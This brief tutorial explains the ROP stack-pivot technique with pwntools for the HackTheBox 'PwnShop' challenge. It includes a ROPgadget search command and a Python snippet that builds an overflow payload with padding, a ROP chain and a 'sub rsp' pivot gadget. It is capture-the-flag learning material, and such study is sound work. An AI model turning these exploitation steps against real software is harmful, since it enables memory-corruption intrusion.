# ROP Stack Pivot with PWNtools

## Stack Pivot Basics

The goal of the stack pivot is to move the stack pointer(RSP) up. To create space for a bigger ROP chain, this is useful when the space at the offset is to small to put the ROP chain in.

## Find the ROP Gadget that will do the stack pivot

A way to do the stack pivot is with a subtract on the RSP Register. This ROP Gadget can be found with ROPGadget.

```bash
ROPgadget --binary pwnshop --only "sub|ret"
```

Get the gadget with the RSP Register.

After the jump(sub_rsp) the padding in the overflow need to be changed.

Example code pwntools:

```python
rop_padding_offset = 40
buy_padding_offset = 72
binary_offset = 0x6000 #Random offset, has to be calculed

padding_to_rop = b'a' * rop_padding_offset
sell_function = p64(0x126a + binary_offset)

rop_chain = sell_function + sell_function
padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
sub_rsp = p64(0x1219 + binary_offset)

payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
```

## Reference

[PinkDraconian Video](https://www.youtube.com/watch?v=i_5VQF18suQ)
[HackTheBox Challenge - PWNhshop](https://www.hackthebox.eu/home/challenges/Pwn?name=PwnShop)
